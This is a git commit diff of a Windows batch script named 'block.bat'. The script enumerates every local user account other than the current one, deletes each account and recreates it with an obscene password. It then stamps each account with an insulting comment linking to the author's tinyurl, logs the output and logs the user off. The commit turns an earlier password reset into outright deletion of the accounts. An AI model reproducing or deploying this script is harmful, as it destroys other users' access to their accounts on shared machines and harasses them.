245785e23827d27e0b7d34db53a90828584b6157
giggityfiles <giggityfiles@gmail.com>
2025-10-07 10:41:32 -0400

    Update block.bat

--- block.bat
+++ block.bat
@@ -1,4 +1,6 @@
 @echo off
+cd C:/
+mkdir Logs
 for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
 if not defined currentUser set currentUser=%username%
 for /f "skip=1" %%u in ('wmic useraccount get name') do (
@@ -6,11 +8,12 @@ for /f "skip=1" %%u in ('wmic useraccount get name') do (
     setlocal enabledelayedexpansion
     set "trim=!user: =!"
     if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
-        net user "!trim!" anus
+        net user "!trim!" /delete
+        net user "!trim!" anus /add
         net user "!trim!" /comment:"get fucked. tinyurl.com/ggtfiles"
     )
     endlocal
 
     
-)
+) >> C:/Logs/finished.txt
 logoff
